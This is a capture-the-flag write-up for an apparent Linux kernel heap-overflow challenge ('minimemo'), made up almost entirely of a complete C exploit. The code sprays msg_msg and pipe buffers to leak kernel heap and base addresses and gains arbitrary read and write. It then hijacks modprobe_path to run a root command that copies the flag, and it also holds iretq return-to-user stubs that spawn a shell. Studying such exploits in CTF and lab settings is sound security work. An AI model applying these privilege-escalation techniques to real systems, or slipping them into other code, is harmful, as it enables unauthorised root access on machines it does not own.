# Challenge

[Attachment][1]

Heap Overflow to link arbitrary address in to the chain so we can aar/aaw.

# Exploitation
```c
// https://github.com/n132/libx/blob/main/libx.c
// gcc main.c -o ./main -lx -w
#include "libx.h"
#include <keyutils.h>

#if defined(LIBX)
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    size_t back2root = shell;
    void back2userImp(){
        __asm__("mov rax, user_ss;"
            "push rax;"
            "mov rax, user_sp;"
            "push rax;"
            "mov rax, user_rflags;"
            "push rax;"
            "mov rax, user_cs;"
            "push rax;"
            "mov rax, back2root;"
            "push rax;"
            "swapgs;"
            "push 0;"
            "popfq;"
            "iretq;"
            );
    }
    int sk_skt[0x20][2];
    int pipe_fd[PIPE_NUM][2];
    void libxInit(){
        back2user = back2userImp;
        hook_segfault();
        saveStatus();
        // initSocketArray(sk_skt);
        initPipeBuffer(pipe_fd);
    }
    enum spray_cmd {
    ADD,
    FREE,
    EXIT,
    };
#endif // 
int fd = 0;
typedef struct {
  char data[20];
  int id;
  int size;
} request_t;
int edit(int id,int size, __u8 * payload){
    request_t pay = {.id=id,.size=size,};
    memcpy(pay.data,payload,20);
    return ioctl(fd,0x11451402,&pay);
};
int add(){
    request_t pay = {};
    return ioctl(fd,0x11451401,&pay);
};

int del(int id){
    request_t pay ={.id=id};
    return ioctl(fd,0x11451403,&pay);
}

msgMsg* msgPeekCheckRet(int msgid,size_t size){
    msgMsg* recv = (msgMsg *)calloc(1,sizeof(long)+size+1);
    size_t ret = msgrcv(msgid, recv, size, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY );
    warn(hex(ret));
    if (ret>0x10) {
        return NULL;
    }
    return recv;
}
int main(){
    // shell();
    libxInit();
    for(int i = 0 ; i< 0x10; i++){
        pipeBufferResize(pipe_fd[i][0],0x2);
    }
    fd = open("/dev/memo",2);
    int msgId[0x200] = {};
    for(int i = 0 ; i < 0x200; i++){
        msgId[i] = msgGet();
    }
    char * trash = calloc(1,0x11);
    memset(trash,'1',0x10);
    msgSpray(0x10,0x30000,trash);
    msgSpray(0xfd0,0x100,trash);
    int list[0x1000]={};
    size_t end =  0x200;

    char *xxx = dp('\x11',0xfd0);
    for(int i = 0 ; i < 0x100; i++)
        add();
    for(int i = 0 ; i < end; i++){
        list[i] = add();
        if(list[i]%0x40==0x10){
            edit(list[i],21,dp('\x99',20));     
            end = i+6;
            // debug();
        }else{
            edit(list[i],20,dpn('i',12,20));
        }
        msgSend(msgId[i],0x10,xxx);   
    }
    for(int i = 0 ; i< 0x10; i++){
        pipeBufferResize(pipe_fd[i][0],1);
    }
    size_t payload[] = {0x200000000000,0,0,0};
    size_t probe = edit(0x800,20,flatn(payload,4));
    assert(0x800 == probe);


    size_t heap = 0;
    size_t base = 0;
    for(int i = end-0x10; i< end; i++)
    {
        msgMsg *res = msgRecv(msgId[i],0x2000);
        if(res==NULL){
            continue;
        }
        if(*(size_t *)(res->mtext+0x10) !=0)
        {
            // hexdump(res->mtext,0x2000);
            size_t *ptr = (size_t *)(res->mtext);
            for(int j = 4 ; j < 0x2000/8 ; j+=8){
                if( base==0 && (((ptr[j])&0xfff) == 0x380) && ((ptr[j+1]) == 0x10)){
                    base = ptr[j] - (0xffffffff81c10380-0xffffffff81000000);
                }
                if (heap==0 && (ptr[j-1]) == 0x6969696969696969){
                    heap = ptr[j+1];
                }
                if(heap!=0 && base !=0)
                    break;
            }
            break;
        }
    }
    probe = msgGet();
    msgSpray(0x10,0x10,trash);

    for(int i = 0 ; i < 0x100; i++)
        add();
    end = 0x200;

    for(int i = 0 ; i < end; i++){
        list[i] = add();
        if(list[i]%0x40==0x18){
            edit(list[i],21,dp('\x88',20));     
            end = i+6;
            // debug();
        }else{
            edit(list[i],20,dpn('i',12,20));
        }
        msgSend(msgId[i+0x100],0x10,xxx);   
    }
    warn(hex(heap));
    warn(hex(base));
    for(int i = end-0x10+0x100; i< end+0x100; i++)
        msgRecv(msgId[i],0x10);
    
    
    char *ppp = calloc(1,0x10);
    size_t fake_hd[2] = {0xFFFFFFFF81E367C0-0xffffffff81000000+base-4,0xdeadbeef};
    memcpy(ppp,fake_hd,0x10);
    msgSpray(0x10,0x10,ppp);

    // debug();
    edit(0,10,"/tmp/n132");
    modprobeAtk("/tmp/","cat /flag > /n132");
    system("cat /n132");
    debug();
}

```

# Write Ups from Others

- https://kileak.github.io/ctf/2021/asis21-minimemo/


[1]: https://kileak.github.io/assets/asis21/minimemo/minimemo.tar.gz